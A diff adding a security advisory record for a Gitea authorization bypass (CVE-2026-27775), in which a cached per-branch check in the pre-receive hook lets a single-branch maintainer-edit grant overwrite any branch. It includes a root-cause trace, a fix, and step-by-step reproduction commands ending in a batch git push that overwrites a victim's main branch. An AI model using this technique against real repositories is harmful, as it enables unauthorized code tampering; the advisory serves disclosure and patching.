@@ -1,0 +1,65 @@
+{
+  "id": "GHSA-649p-mmhf-85c7",
+  "modified": "2026-07-21T21:48:11.543200644Z",
+  "published": "2026-07-21T21:43:11Z",
+  "aliases": [
+    "CVE-2026-27775"
+  ],
+  "summary": "Gitea: Cached Per-Branch Permission Check in Pre-Receive Hook Allows Full Repository Write",
+  "details": "## Vulnerability Header\n\n| Field               | Value                                                                               |\n| ------------------- | ----------------------------------------------------------------------------------- |\n| Vulnerability Title | Cached Per-Branch Permission Check in Pre-Receive Hook Allows Full Repository Write |\n| Severity Rating     | High                                                                                |\n| Bug Category        | Authorization Bypass                                                                |\n| Location            | `routers/private/hook_pre_receive.go:55-64`, `CanWriteCode()`                       |\n| Affected Versions   | 1.25.5                                                                              |\n\n## Executive Summary\n\nThe pre-receive hook in Gitea evaluates the `CanMaintainerWriteToBranch` permission only once per `git push` session and caches the result for all subsequent refs in the same batch. An attacker who has a legitimate per-branch write grant (e.g., via an open pull request with \"Allow edits from maintainers\" enabled) can batch-push that branch together with any other ref. The cached `true` from the first ref is reused for all following refs, allowing the attacker to overwrite protected branches (including `main`), create arbitrary new branches, and push tags. This effectively escalates a single-branch maintainer-edit grant into full repository write access.\n\n## Root Cause Analysis\n\n### Technical Description\n\nWhen processing a multi-ref `git push`, the `HookPreReceive` handler at `hook_pre_receive.go:107` iterates over all incoming refs. For each branch ref, `preReceiveBranch` (`:140`) updates `ctx.branchName` to the current branch (`:142`) and then calls `AssertCanWriteCode()` (`:144`).\n\n`CanWriteCode()` (`:55-64`) checks whether the user can write to the repository. On the first call, it evaluates `issues_model.CanMaintainerWriteToBranch(ctx, userPerm, ctx.branchName, user)` and stores the result in a boolean flag (`canWriteCode`) with a guard (`checkedCanWriteCode`). On all subsequent calls within the same batch, it returns the cached boolean without re-evaluating against the now-different `ctx.branchName`.\n\nThis means the permission check is branch-specific in its inputs but session-scoped in its caching — a classic check-vs-use divergence.\n\nA second contributing factor is the AGit-flow relaxation at `routers/web/repo/githttp.go:190-192` (and `routers/private/serv.go:337-338`), which downgrades the outer `receive-pack` access gate from `Write` to `Read` when `git.DefaultFeatures().SupportProcReceive` is true (git ≥ 2.29). This allows a user with only Read access on a repository to initiate a `receive-pack` session, deferring all authorization to the pre-receive hook — which contains the caching bug described above.\n\n### First Faulty Condition\n\n| File      | `routers/private/hook_pre_receive.go` |\n| --------- | ------------------------------------- |\n| Line      | 55-64                                 |\n| Condition | `CanWriteCode()` evaluates the branch-specific `CanMaintainerWriteToBranch` check only on the first invocation and caches the result, reusing it for all subsequent refs in the batch regardless of which branch they target. |\n\n### Trace Analysis\n\nThe following is the path from the attacker's `git push` to the authorization fault:\n\n1. `POST /{owner}/{repo}.git/git-receive-pack` → `routers/web/repo/githttp.go:437` (`ServiceReceivePack`) → `httpBase()` (`:60`)\n   - Access gate is downgraded from Write to Read at `:190-192` due to AGit-flow support.\n\n2. `git receive-pack` invokes the pre-receive hook → `cmd/hook.go:184` (`runHookPreReceive`) → `modules/private/hook.go:96` (`HookPreReceive`) → internal API → `routers/private/hook_pre_receive.go:107` (`HookPreReceive`)\n\n3. Loop at `:117` iterates over all refs in the batch. For each branch ref, `preReceiveBranch` (`:140`) sets `ctx.branchName` at `:142`.\n\n4. **Fault**: `AssertCanWriteCode()` (`:144`) → `CanWriteCode()` (`:55-64`).\n   - First ref (`feature-branch`): `checkedCanWriteCode` is false → evaluates `CanMaintainerWriteToBranch(ctx, userPerm, \"feature-branch\", user)` → returns `true` (legitimate grant) → caches result.\n   - Second ref (`main`): `checkedCanWriteCode` is already true → returns cached `true` **without re-evaluating** against `\"main\"`.\n\n5. Hook returns 200 → `git receive-pack` accepts all refs → `main` is overwritten in the victim's repository.\n\n## Exploitability Assessment\n\n### Attack Vector \u0026 Reachability\n\n| Attack vector               | Network                                                                             |\n| --------------------------- | ----------------------------------------------------------------------------------- |\n| Authentication required     | Low                                                                                 |\n| User interaction required   | Required. Victim must enable \"Allow edits from maintainers\" on their PR             |\n| Reachable in default config | Yes                                                                                 |\n| Entry point                 | `git push` over smart-HTTP or SSH with multiple refs in a single operation          |\n\nThe attacker gains full write access to the victim's repository — equivalent to having push permissions on all refs. By controlling the order of refs in the batch (e.g., naming the granted branch so it sorts first), the attacker reliably ensures the legitimate ref is evaluated before the target. This is not a race condition; it is deterministic.\n\n### Reproduction Steps\n\n**Environment**\nThe issue was reproduced using Gitea v1.25.5 on Ubuntu 24.04.4 LTS.\n\n**Prerequisites:** \n* a Gitea instance with two users, `attacker` and `victim`.\n\n```bash\n# 1. Attacker creates a repository (e.g., a popular open-source project)\ncurl -X POST \"http://attacker:pw@\u003cgitea\u003e/api/v1/user/repos\" \\\n  -H \"Content-Type: application/json\" \\\n  -d '{\"name\": \"project\", \"auto_init\": true}'\n\n# 2. Victim forks attacker's repository (standard contributor workflow)\ncurl -X POST \"http://victim:pw@\u003cgitea\u003e/api/v1/repos/attacker/project/forks\" \\\n  -H \"Content-Type: application/json\" \\\n  -d '{}'\n\n# 3. Victim creates a feature branch on their fork and commits a change\ncurl -X POST \"http://victim:pw@\u003cgitea\u003e/api/v1/repos/victim/project/branches\" \\\n  -H \"Content-Type: application/json\" \\\n  -d '{\"new_branch_name\": \"feature-branch\", \"old_branch_name\": \"main\"}'\n\ncurl -X POST \"http://victim:pw@\u003cgitea\u003e/api/v1/repos/victim/project/contents/contribution.txt\" \\\n  -H \"Content-Type: application/json\" \\\n  -d '{\"message\": \"Add contribution\", \"content\": \"'$(echo -n \"victim contribution\" | base64)'\", \"branch\": \"feature-branch\"}'\n\n# 4. Victim opens a PR from their feature branch into attacker/project\n#    with \"Allow edits from maintainers\" enabled\ncurl -X POST \"http://victim:pw@\u003cgitea\u003e/api/v1/repos/attacker/project/pulls\" \\\n  -H \"Content-Type: application/json\" \\\n  -d '{\"title\": \"Feature PR\", \"head\": \"victim:feature-branch\", \"base\": \"main\", \"allow_maintainer_edit\": true}'\n```\n\nAt this point, the attacker (as maintainer of the base repo `attacker/project`) has a per-branch write grant on the victim's fork, scoped to the `feature-branch` branch only.\n\n**Attack**\n\nThe attacker works from their own repo (`attacker/project`)\n```bash\n# 5. Attacker clones their own repo\ngit clone http://attacker:pw@\u003cgitea\u003e/attacker/project.git \u0026\u0026 cd project\n\n# 6. Attacker fetches the victim's PR branch\ngit fetch -u http://\u003cgitea\u003e/victim/project feature-branch:victim-feature-branch\ngit checkout victim-feature-branch\n\n# 7. Attacker adds a commit to the PR branch\necho \"legitimate change\" \u003e feature.txt \u0026\u0026 git add . \u0026\u0026 git commit -m \"PR update\"\n\n# 8. Attacker also prepares a malicious commit on main\ngit checkout main\necho \"MALICIOUS CONTENT\" \u003e PWNED \u0026\u0026 git add . \u0026\u0026 git commit -m \"pwned\"\n\n# 9. Attacker pushes both refs to the victim's fork in a single operation — this is the exploit\ngit push http://attacker:pw@\u003cgitea\u003e/victim/project.git victim-feature-branch:feature-branch main:main\n\n# 10. The change on both refs is visible regardless of PR status\n```\n\n**Expected result**: \n`main` should be rejected (\"User permission denied for writing\").\n\n**Actual result**: \nBoth refs are accepted. `victim/project:main` now contains the attacker's malicious commit.\n\n```bash\n# Verify: victim checks their fork's main branch\ncurl \"http://victim:pw@\u003cgitea\u003e/api/v1/repos/victim/project/contents/PWNED?ref=main\"\n# Returns attacker's \"MALICIOUS CONTENT\" — main has been overwritten\n```\n\nThe same technique also works for pushing arbitrary tags (`refs/tags/*`) and creating new branches.\n\n## Recommended Fix\n\nRemove the caching in `CanWriteCode()` — the `CanMaintainerWriteToBranch` check must be evaluated for every ref in the batch, not cached after the first call. The `checkedCanWriteCode` / `canWriteCode` fields on `preReceiveContext` and the guard in `CanWriteCode()` at `hook_pre_receive.go:55-64` should be removed, so the permission is evaluated fresh each time `preReceiveBranch` or `preReceiveTag` calls it. `loadPusherAndPermission()` already has its own caching (`loadedPusher`), so the per-call cost is limited to the `CanMaintainerWriteToBranch` query.\n\nSee [diff.patch](https://github.com/user-attachments/files/28831842/diff.patch) for the proposed fix.\n\nPatch provenance: AI-generated, human-reviewed.\n\n## Attribution\n\nThis vulnerability was discovered by Claude, Anthropic's AI assistant, and triaged by **Adrian Denkiewicz** at **Doyensec** in collaboration with Anthropic Research.\n\nFor CVE credits and public acknowledgments: **Doyensec in collaboration with Claude and Anthropic Research**",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "Go",
+        "name": "code.gitea.io/gitea",
+        "purl": "pkg:golang/code.gitea.io/gitea"
+      },
+      "ranges": [
+        {
+          "type": "SEMVER",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "1.26.3"
+            }
+          ]
+        }
+      ],
+      "database_specific": {
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/07/GHSA-649p-mmhf-85c7/GHSA-649p-mmhf-85c7.json"
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/go-gitea/gitea/security/advisories/GHSA-649p-mmhf-85c7"
+    },
+    {
+      "type": "ADVISORY",
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-27775"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/go-gitea/gitea/pull/38151"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/go-gitea/gitea/commit/99f8b3d9a1d32f4c39828e07971455a18191e0b9"
+    },
+    {
+      "type": "WEB",
+      "url": "https://blog.gitea.com/release-of-1.26.3-and-1.26.4"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/go-gitea/gitea"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/go-gitea/gitea/releases/tag/v1.26.3"
+    }
+  ]
+}
